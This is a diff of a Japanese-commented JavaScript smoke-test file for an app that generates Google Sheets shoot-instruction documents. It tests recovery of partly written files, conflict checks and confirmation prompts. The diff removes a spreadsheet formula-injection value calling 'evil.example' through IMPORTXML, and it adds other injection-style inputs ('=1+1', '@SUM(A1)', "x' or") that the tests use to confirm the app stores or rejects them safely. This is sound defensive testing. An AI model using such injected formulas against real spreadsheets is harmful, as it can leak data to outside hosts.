@@ -6714,6 +6714,8 @@ let wfSetParentId = null;
           if (!tabs.length) throw gErr(400, 'You can\'t remove all the sheets in a document.');
           f.tabs = tabs;
           g.batches += 1;
+          // 書けた直後 (記録する前) に、ほかの人の操作を割り込ませる口
+          if (g.onBatch) { const fn = g.onBatch; g.onBatch = null; fn(p); }
           return { data: { replies: [] } };
         },
       } };
@@ -6855,21 +6857,31 @@ let wfSetParentId = null;
       check('撮影指示書: 社内撮影に戻すと「依頼文」のタブを消し、名前も戻す (人のメモは残す)',
         r.status === 200 && !tabOf(f1b, '依頼文') && !!tabOf(f1b, '人のメモ') && f1b.name === '撮影指示書_DRV-SHEET（社内撮影）', JSON.stringify(f1b.tabs.map((t) => t.title)));
 
-      // 数式の注入: API でカットを渡す口 (B・C から使う)。値は文字のまま RAW で入る
-      const evilCut = { label: '1枚目', cut: '=IMPORTXML("https://evil.example/","//a")', props: '+1', ng: '@SUM(A1)' };
-      r = await sheetCall({ cuts: [evilCut] });
+      // 数式の注入: 材料は AI の出力 (LP構成)。= + @ で始まる値も文字のまま入る
+      const evilText = lpText.replace(/(# 1枚目｜FV[\s\S]*?## 装飾・演出\n)[^\n]*/, '$1+1')
+        .replace(/(# 1枚目｜FV[\s\S]*?## 使用素材\n)[^\n]*/, '$1撮影: =1+1')
+        .replace(/(# 1枚目｜FV[\s\S]*?## NG事項\n)[^\n]*/, '$1@SUM(A1)');
+      check('撮影指示書: (前提) 数式のような材料の LP構成を作れた', evilText.includes('撮影: =1+1') && evilText.includes('\n@SUM(A1)'));
+      addJob(idS, 'done', evilText);
+      r = await sheetCall();
       const evRow = tabOf(f1b, '撮影指示').values[7];
-      check('🚨 撮影指示書: = + @ で始まる材料も文字のまま (RAW) — 数式にしない',
-        r.status === 200 && evRow[2] === evilCut.cut && evRow[4] === '+1' && evRow[7] === '@SUM(A1)' && g.cellKinds.size === 1 && g.cellKinds.has('stringValue'), JSON.stringify(evRow));
-      check('撮影指示書: API で渡したカットで作ったときは source=request (LP構成とは比べない = 「更新が要る」を出さない)',
-        ipS().shoot_sheet_source === 'request' && !(await pageOf()).includes('id="shoot-sheet-stale"'));
+      check('🚨 撮影指示書: = + @ で始まる材料も文字のまま (stringValue) — 数式にしない',
+        r.status === 200 && evRow[2] === '=1+1' && evRow[4] === '+1' && evRow[7] === '@SUM(A1)' && g.cellKinds.size === 1 && g.cellKinds.has('stringValue'), JSON.stringify(evRow));
+      addJob(idS, 'done', lpText);
+      r = await sheetCall();
       const badCuts = [];
-      for (const body of [{ cuts: 'x' }, { cuts: [{ cut: 1 }] }, { cuts: Array.from({ length: 41 }, () => ({})) }, { replace_manual_url: 5 }, { mention: '@a\n@b' }, { mention: 'x'.repeat(61) }]) badCuts.push((await sheetCall(body)).status);
-      check('撮影指示書: カットの形が違う・replace_manual_url が文字でない・宛先が 2 行/61 文字以上なら 400', badCuts.every((s) => s === 400), JSON.stringify(badCuts));
+      for (const body of [{ cuts: [] }, { cuts: [{ cut: '古いタブのカット' }] }, { replace_manual_url: 5 }, { mention: '@a\n@b' }, { mention: 'x'.repeat(61) }, { overwrite_file_id: "x' or" }]) badCuts.push((await sheetCall(body)).status);
+      check('🚨 撮影指示書: 中身 (cuts) は送れない (正本の LP構成と違う中身を書かせない・名指し3 M)・replace_manual_url / overwrite_file_id の形が違う・宛先が 2 行/61 文字以上なら 400',
+        r.status === 200 && badCuts.every((s) => s === 400) && !tabOf(f1b, '撮影指示').values.flat().includes('古いタブのカット'), JSON.stringify(badCuts));
 
       // 手で貼った URL: 黙って差し替えない (409 → 確かめた URL を添えて送り直す)
       const MANUAL = 'https://docs.google.com/spreadsheets/d/manual-by-hand/edit';
       r = await call('POST', `/api/drafts/${idS}/image-production`, { camera_instruction_url: MANUAL });
+      check('🚨 撮影指示書: 指示書の URL を変える保存で、開いたときの値を添えない (古い画面・直接の呼び出し) は 409 (名指し3 M)',
+        r.status === 409 && ipS().camera_instruction_url === URL_OF(f1.id), JSON.stringify(r));
+      r = await call('POST', `/api/drafts/${idS}/image-production`, { camera_instruction_url: URL_OF(f1.id), status: '同じ URL' });
+      check('撮影指示書: 同じ URL を送るだけの保存は、開いたときの値を添えなくても通る', r.status === 200);
+      r = await call('POST', `/api/drafts/${idS}/image-production`, { camera_instruction_url: MANUAL, camera_instruction_url_expected: URL_OF(f1.id) });
       pg = await pageOf();
       check('画面: 指示書の URL を手で貼り替えたら「撮影指示書を作成」に戻る (作ったファイルを指していない)', r.status === 200 && pg.includes('>撮影指示書を作成 (スプレッドシート)</button>'));
       r = await sheetCall();
@@ -6906,6 +6918,31 @@ let wfSetParentId = null;
       check('🚨 撮影指示書: 次に押すと、前に作ったファイルを印 (appProperties) で拾い直す (2 つ作らない)',
         r.status === 200 && filesIn().length === before + 1 && ipF().camera_instruction_url === r.json?.url && tabOf(g.files.get(ipF().shoot_sheet_file_id), '依頼文'),
         JSON.stringify([r, filesIn().length]));
+      // 🚨 書いた後・記録する前に止まった (ここでは記録のときに版が変わった) 撮影指示書: 次に押すと拾い直すが、
+      //    もう指示書のタブ (印つき) があるので、上書きしてよいかを聞く (人が直しているかもしれない・名指し3 M)
+      {
+        const idR = Number(db.prepare(`INSERT INTO product_drafts (ne_code, name, created_by, drive_folder_url) VALUES ('DRV-SHEET-R', '拾い直し用', 'smoke', ?)`).run(FOLDER).lastInsertRowid);
+        await call('POST', `/api/drafts/${idR}/shoot-mode`, { mode: 'inhouse' });
+        const ipR = () => db.prepare('SELECT * FROM draft_image_production WHERE draft_id = ?').get(idR) || {};
+        g.onBatch = () => db.prepare('UPDATE product_drafts SET name = ? WHERE id = ?').run('拾い直し用 改', idR);
+        r = await call('POST', `/api/drafts/${idR}/shoot-sheet`, {});
+        const orphanR = filesIn().find((f) => f.appProperties.phShootSheetDraft === String(idR));
+        check('撮影指示書: (前提) 書いた後に記録で止まった (409・URL なし・ファイルは書けている)',
+          r.status === 409 && ipR().camera_instruction_url == null && !!orphanR && !!tabOf(orphanR, '撮影指示'), JSON.stringify(r));
+        tabOf(orphanR, '撮影指示').values[7] = ['1', '人が直した行'];
+        const bR = g.batches;
+        r = await call('POST', `/api/drafts/${idR}/shoot-sheet`, {});
+        check('🚨 撮影指示書: 拾い直したファイルに指示書のタブがあれば、上書きせずに 409 (recovered_file) で確かめる',
+          r.status === 409 && r.json?.code === 'recovered_file' && r.json?.file_id === orphanR.id && g.batches === bR
+          && tabOf(orphanR, '撮影指示').values[7][1] === '人が直した行' && ipR().camera_instruction_url == null, JSON.stringify(r));
+        r = await call('POST', `/api/drafts/${idR}/shoot-sheet`, { overwrite_file_id: 'SS999999' });
+        check('撮影指示書: 確かめたファイルと違う ID なら、もう一度 409', r.status === 409 && r.json?.code === 'recovered_file');
+        r = await call('POST', `/api/drafts/${idR}/shoot-sheet`, { overwrite_file_id: orphanR.id });
+        check('撮影指示書: 確かめたファイルの ID を添えれば、そのファイルを上書きして記録する (2 つ作らない)',
+          r.status === 200 && ipR().camera_instruction_url === URL_OF(orphanR.id) && filesIn().filter((f) => f.appProperties.phShootSheetDraft === String(idR)).length === 1, JSON.stringify(r));
+        db.prepare('DELETE FROM product_drafts WHERE id = ?').run(idR);
+      }
+
       // 前に作ったファイルがごみ箱に → 作り直して URL を替える。作った直後 (タブを読む前) に人が足したタブは消さない
       g.files.get(ipF().shoot_sheet_file_id).trashed = true;
       const oldF = ipF().shoot_sheet_file_id;
@@ -7229,6 +7266,13 @@ let wfSetParentId = null;
           u.st.asked[0] === '手で貼ったものが入っています。置き換えますか？' && u.st.posts.length === 2 && u.st.posts[1][1].replace_manual_url === 'https://h1'
           && u.st.posts[1][1].mention === '@その回' && u.st.reloads.length === 1, JSON.stringify(u.st.posts));
         check('画面の JS: 作るときは画面の宛先の欄 (その回だけ) の値を送る', u.st.posts[0][1].mention === '@その回');
+        const ur = mkSheetUi({ replies: [{ ok: false, code: 'recovered_file', file_id: 'F1', error: '前に作りかけた撮影指示書があります。上書きしますか？' }, { ok: true, created: false }], answers: [true] });
+        await ur.els['shoot-sheet-btn'].fire('click');
+        check('画面の JS: 前に作りかけた撮影指示書があると言われたら確かめて、そのファイルの ID (overwrite_file_id) を添えて送り直す',
+          ur.st.asked[0].includes('上書きしますか') && ur.st.posts.length === 2 && ur.st.posts[1][1].overwrite_file_id === 'F1' && ur.st.reloads.length === 1, JSON.stringify(ur.st.posts));
+        const ur2 = mkSheetUi({ replies: [{ ok: false, code: 'recovered_file', file_id: 'F1', error: '上書きしますか？' }], answers: [false] });
+        await ur2.els['shoot-sheet-btn'].fire('click');
+        check('画面の JS: 上書きをやめたら送り直さない', ur2.st.posts.length === 1 && /やめました/.test(ur2.els['shoot-sheet-msg'].textContent));
         const u2 = mkSheetUi({ replies: [{ ok: false, code: 'manual_url', error: '置き換えますか？' }], answers: [false] });
         await u2.els['shoot-sheet-btn'].fire('click');
         check('画面の JS: 置き換えをやめたら送り直さず「やめました」', u2.st.posts.length === 1 && /やめました/.test(u2.els['shoot-sheet-msg'].textContent) && u2.els['shoot-sheet-btn'].disabled === false);
